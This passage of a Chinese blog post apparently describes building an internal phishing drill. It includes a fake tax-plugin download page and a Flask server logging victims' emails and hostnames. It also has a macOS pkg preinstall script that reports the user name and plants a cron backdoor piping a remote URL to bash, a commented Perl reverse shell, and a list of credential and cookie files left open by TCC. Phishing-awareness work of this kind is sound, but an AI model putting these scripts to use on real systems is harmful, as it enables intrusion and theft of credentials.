property">focusConfirm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                            <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token string">'晚些会向您发送邮件通知，请安装税务系统插件: &lt;a href="https://example.com/download/osx">点击下载&lt;/a> '</span><span class="token punctuation">,</span>                            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'success'</span>                            <span class="token punctuation">&#125;</span>                            <span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                                           <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                http<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h2><p>后端需要收集用户提交的表单信息，如果运行了EXE或者PKG需要把用户的信息上传到服务端，整体代码如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORS<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> timeapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    CONN <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'fish.db'</span><span class="token punctuation">)</span>    CURSOR <span class="token operator">=</span> CONN<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS users (                id INTEGER PRIMARY KEY AUTOINCREMENT,                corpname TEXT NOT NULL,                email TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            );        """</span>    <span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS osx (                id INTEGER PRIMARY KEY AUTOINCREMENT,                osxname TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            )        """</span>    <span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS win (                id INTEGER PRIMARY KEY AUTOINCREMENT,                pcname TEXT NOT NULL,                username TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            )        """</span>    <span class="token punctuation">)</span><span class="token comment"># 收集表单数据</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    corpname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'corpname'</span><span class="token punctuation">]</span>    email <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT  INTO users(corpname, email) VALUES (?, ?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>corpname<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># 运行Exe之后收集用户名和pcname，定位员工</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/windata'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">windata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    pcname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'pcname'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO win(username, pcname) VALUES (?,?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> pcname<span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># 运行了pkg的会新建一个定时任务后门，请求这个URL</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/osxdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">osx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#return "perl -e 'use Socket;$i=\"&lt;ip>\";$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"sh -i\");&#125;;' "</span>    <span class="token keyword">return</span> <span class="token string">"echo 'helo world'"</span><span class="token comment"># 运行PKG之后，收集用户名，定位员工</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/osxdata'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">osxdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT  INTO osx(osxname) VALUES (?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># 下载插件功能</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download/&lt;plat>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>plat<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Disposition'</span><span class="token punctuation">:</span> <span class="token string">'attachment; filename=税务申报插件.zip'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"osx"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/finace.pkg"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"sh"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/install.sh"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"zip"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/osx.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/win.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="OS-X的钓鱼实践"><a href="#OS-X的钓鱼实践" class="headerlink" title="OS X的钓鱼实践"></a>OS X的钓鱼实践</h2><p>OS X在实际测试碰到几个问题：</p><ul><li>比如OS X应该用什么木马平台</li><li>PKG安装的时候是以root权限运行的，怎么获取登录的用户名</li><li>为啥root反弹的pkg不能查看普通用户的桌面（此处是因为TCC机制）</li></ul><h3 id="OS-X的恶意PKG"><a href="#OS-X的恶意PKG" class="headerlink" title="OS X的恶意PKG"></a>OS X的恶意PKG</h3><p>PKG的制作最简单的可以参考<a href="https://www.cnblogs.com/strengthen/p/15933420.html">这篇文章</a>，使用<a href="http://s.sudre.free.fr/Software/Packages/about.html">Packages</a>，利用preinstall脚本，脚本的代码如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>dscacheutil -q group -a name admin<span class="token operator">|</span><span class="token function">grep</span> <span class="token function">users</span><span class="token operator">|</span><span class="token function">cut</span> -d <span class="token string">" "</span> -f <span class="token number">3</span><span class="token variable">)</span></span><span class="token function">curl</span> -XPOST https://example.com/osxdata -d <span class="token string">"user=<span class="token environment constant">$USER</span>"</span><span class="token function">crontab</span> -l <span class="token operator">></span> /private/tmp/you_have_been_pwn.txt<span class="token builtin class-name">echo</span> <span class="token string">"*/5 * * * * curl -sSL https://example.com/osxdoor | bash"</span> <span class="token operator">>></span> /tmp/you_have_been_pwn.txt<span class="token function">crontab</span> /private/tmp/you_have_been_pwn.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>root用户获取普通用户名的方式: <code>USER=$(dscacheutil -q group -a name admin|grep users|cut -d &quot; &quot; -f 3)</code></p><h3 id="OS-X下的渗透测试攻击"><a href="#OS-X下的渗透测试攻击" class="headerlink" title="OS X下的渗透测试攻击"></a>OS X下的渗透测试攻击</h3><p>参考下面这几个文章:</p><ul><li><a href="https://mp.weixin.qq.com/s/MVb1x-jsSAHu-Bn1sjDXAQ">国护准备之macos攻击</a></li><li><a href="https://mp.weixin.qq.com/s/CwqE0AgpzbUqdmg4R57_zA">MacOS钓鱼实践</a></li><li><a href="https://blog.macoder.tech/macOS-6faf0534323c42259f5277bd95d35c43">打造macOS下最强的微信取证工具</a></li></ul><p>OSX系统下载一个文件到运行的时候，中间会碰到这几个安全拦截:</p><h4 id="Gatekeeper"><a href="#Gatekeeper" class="headerlink" title="Gatekeeper"></a>Gatekeeper</h4><p>Gatekeeper 是一种安全机制，旨在仅允许受信任的应用程序在系统上运行，类似于Windows上的SmartScreen和MOTW。从Internet下载可执行文件时，它们会标有属性com.apple.quarantine，该属性会在文件运行时触发网守。如果可执行文件未经过公证，Gatekeeper 将向用户显示提示，通知他们该文件无法运行，因为它未签名。要运行未签名的可执行文件，用户必须右键单击该文件，然后单击打开，而不是双击。</p><p>在验证代码签名后，macOS的内置防病毒软件XProtect将扫描文件中的恶意软件。XProtect使用YARA规则。</p><p>最后，如果您想要对应用程序进行公证，您可以注册Apple Developer Program以获得代码签名证书，费用为每年99美元。注册后，您可以签署您的应用程序并将其提交 Apple，在那里它将进行安全扫描并检查其他要求，例如强化运行时（在下一节中介绍）是否已启用。如果您提交恶意软件，Apple的安全扫描可能会忽略它并仍然公证您的应用程序，证书可能很快就会被吊销。</p><h4 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h4><p>Transparency, Consent, and Control(TCC)是在 v10.14+ 中实现的 macOS 隐私功能，当应用程序尝试访问某些资源（例如相机）和某些文件夹（包括 Desktop，Downloads，Documents和驱动器/卷）时，它会提示用户明确授予权限。尝试访问受TCC保护的资源而没有权限可能会有弹框提示，导致用户察觉到shell的存在。以下是一些未受TCC保护的有用文件：</p><ul><li>主目录中的隐藏文件和文件夹：<code>~/.aws/*</code>、<code>~/.ssh/*</code>、<code>~/.bash_history</code>、<code>~/.zsh_history</code></li><li>用户应用程序数据 — <code>〜/Library/Application Support/*</code></li><li>Cookie 文件 — <code>~/Library/Application Support/Google/Chrome/Default/Cookies</code> , <code>~/Library/Containers/com.tinyspeck.slackmacgap/Data/Library/Application Support/Slack/Cookies</code></li></ul><p>系统TCC数据库位于 /Library/Application Support/com.apple.TCC/TCC.db，每个用户都有一个位于 ~/Library/Application Support/com.apple.TCC/TCC.db 的TCC数据库。</p><h2 id="Windows下的EXE"><a href="#Windows下的EXE" class="headerlink" title="Windows下的EXE"></a>Windows下的EXE</h2><p>Windows下的Exe有两个功能:</p><ol><li>执行Exe的时候，获取用户名和主机名，回传发送到服务端</li><li>新建一个helo-world的定时任务，在某个时间点执行弹框Exe，弹窗告诉用户被入侵了</li></ol><p>定时任务直接找CSDN的例子，可以拿来用<a href="https://learn.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--c---">Time Trigger Example (C++</a>，弹窗的Exe代码如下:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token comment">// 窗口过程函数</span>LRESULT CALLBACK <span class="token function">WndProc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT msg<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> WM_PAINT<span class="token operator">:</span>    <span class="token punctuation">&#123;</span>        PAINTSTRUCT ps<span class="token punctuation">;</span>        HDC hdc <span class="token operator">=</span> <span class="token function">BeginPaint</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置字体和颜色</span>        HFONT hFont <span class="token operator">=</span> <span class="token function">CreateFontW</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> FW_NORMAL<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> DEFAULT_CHARSET<span class="token punctuation">,</span> OUT_DEFAULT_PRECIS<span class="token punctuation">,</span> CLIP_DEFAULT_PRECIS<span class="token punctuation">,</span> DEFAULT_QUALITY<span class="token punctuation">,</span> DEFAULT_PITCH <span class="token operator">|</span> FF_SWISS<span class="token punctuation">,</span> L<span class="token string">"Arial"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SelectObject</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> hFont<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetTextColor</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> <span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetBkColor</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> <span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绘制文本</span>        <span class="token keyword">wchar_t</span> text<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token string">"您的电脑已被入侵，请提高信息安全意识，防止钓鱼邮件，ByeBye　:)"</span><span class="token punctuation">;</span>        RECT rect<span class="token punctuation">;</span>        <span class="token function">GetClientRect</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>rect<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DrawTextW</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> text<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>rect<span class="token punctuation">,</span> DT_CENTER <span class="token operator">|</span> DT_VCENTER <span class="token operator">|</span> DT_SINGLELINE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 清理资源</span>        <span class="token function">EndPaint</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DeleteObject</span><span class="token punctuation">(</span>hFont<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">case</span> WM_DESTROY<span class="token operator">:</span>        <span class="token function">PostQuitMessage</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token function">DefWindowProc</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> WINAPI <span class="token function">wWinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPWSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nCmdShow<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 注册窗口类</span>    WNDCLASSEXW wc <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WNDCLASSEXW<span class="token punctuation">)</span><span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> WndProc<span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>hInstance <span class="token operator">=</span> hInstance<span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> L<span class="token string">"MyWindowClass"</span><span class="token punctuation">;</span>    <span class="token function">RegisterClassExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>wc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 创建窗口</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        HWND hWnd <span class="token operator">=</span> <span class="token function">CreateWindowExW</span><span class="token punctuation">(</span>WS_EX_TOPMOST <span class="token operator">|</span> WS_EX_APPWINDOW<span class="token punctuation">,</span> L<span class="token string">"MyWindowClass"</span><span class="token punctuation">,</span> L<span class="token string">"如果有任何问题，请联系安全组 -- By "</span><span class="token punctuation">,</span> WS_OVERLAPPEDWINDOW<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">550</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> hInstance<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hWnd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">MessageBoxW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> L<span class="token string">"Failed to create window"</span><span class="token punctuation">,</span> L<span class="token string">"Error"</span><span class="token punctuation">,</span> MB_OK <span class="token operator">|</span> MB_ICONERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 显示窗口</span>        <span class="token function">ShowWindow</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> nCmdShow<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">UpdateWindow</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 消息循环</span>        MSG msg<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">GetMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">DispatchMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述的Exe编译之后，再新建一个工程，把上面的exe当作资源文件，在运行的时候，释放到特定目录中，定时任务再执行这个文件。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;一年一度的钓鱼节，需要针对公司员工做一次钓鱼演练，前期准备工作如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确定钓鱼的页面：图方便选了一个登录入口，用Chrome插件SingleFile右键一键保存&lt;/li&gt;
&lt;li&gt;确定钓鱼的形式：引导用户输入公司邮箱，点击完成之后，弹出需要安装插件，根据UA决定是下载pkg还是exe。&lt;/li&gt;
&lt;li&gt;确定钓鱼的效果：从三个数据维度来看最终效果&lt;ul&gt;
&lt;li&gt;钓鱼页面访问次数&lt;/li&gt;
&lt;li&gt;输入公司邮箱的数量统计&lt;/li&gt;
&lt;li&gt;收集运行了Exe和Pkg的用户&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;钓鱼邮件的发送&quot;&gt;&lt;a href=&quot;#钓鱼邮件的发送&quot; class=&quot;headerlink&quot; title=&quot;钓鱼邮件的发送&quot;&gt;&lt;/a&gt;钓鱼邮件的发送&lt;/h2&gt;&lt;p&gt;有两种形式可以发送钓鱼邮件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用相近域名&lt;/li&gt;
&lt;li&gt;使用sendcloud&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;相近域名发送&quot;&gt;&lt;a href=&quot;#相近域名发送&quot; class=&quot;headerlink&quot; title=&quot;相近域名发送&quot;&gt;&lt;/a&gt;相近域名发送&lt;/h3&gt;&lt;p&gt;注册相近域名之后，可以根据这里的步骤绑定使用zoho的免费企业邮箱: &lt;a href=&quot;https://zhuanlan.zhihu.com/p/341879374&quot;&gt;2021年四款国内外免费企业邮箱及申请教程图解&lt;/a&gt;&lt;/p&gt;
